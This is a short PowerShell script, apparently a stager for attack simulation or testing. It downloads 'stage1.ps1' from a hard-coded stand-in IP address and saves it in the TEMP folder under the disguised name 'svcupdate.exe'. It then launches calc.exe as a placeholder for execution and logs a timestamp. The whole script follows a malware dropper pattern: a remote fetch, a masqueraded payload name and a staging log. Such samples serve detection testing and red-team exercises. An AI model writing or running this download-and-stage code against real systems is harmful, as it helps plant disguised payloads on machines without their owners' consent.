
<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://198.51.100.57/stage1.ps1',
    [string]$PayloadPath = "$env:TEMP\svcupdate.exe",
    [int]$TransferTimeout = 207
)
try { Invoke-WebRequest -Uri $TransferUrl -OutFile $PayloadPath -UseBasicParsing; Start-Process -FilePath "calc.exe"; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Stage transfer failed" }
